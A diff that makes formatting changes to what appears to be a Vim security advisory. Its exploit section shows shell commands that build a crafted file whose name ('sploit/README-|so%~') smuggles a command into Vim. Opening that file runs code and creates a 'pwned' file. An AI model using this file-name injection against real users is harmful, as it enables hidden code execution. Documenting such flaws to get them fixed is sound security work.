@@ -94,7 +94,7 @@ How much is Vim Script used throughout Vim?
 Script doesn't allow variables as arguments to commands, only literals,
 ``execute'' is very popular:
 
-<code class="vim">         let a = &quot;vim&quot;
+<code class="vim">       let a = &quot;vim&quot;
 	execute &quot;setfiletype&quot; a   &quot; Alternative is cumbersome
 	let b = &quot;/path/to/foo&quot;
 	execute &quot;split&quot; b 	  &quot; No alternative</code>
@@ -243,7 +243,7 @@ Shell commands.  Content of the file is not important.
 
 3.4.2.1.2. Exploit
 
-	$ cd filetype.vim
+<code class="sh">	$ cd filetype.vim
 	$ EXPLOIT_FLAVOUR=weak make -s clean sploit
 	$ readlink exploit
 	sploit/README-|so%~
@@ -252,7 +252,7 @@ Shell commands.  Content of the file is not important.
 	$ vim &quot;`readlink exploit`&quot;
 	[ Observe the file looks quite normal ]
 	$ ls pwned
-	pwned
+	pwned</code>
 
 
 3.4.2.1.3. Fix
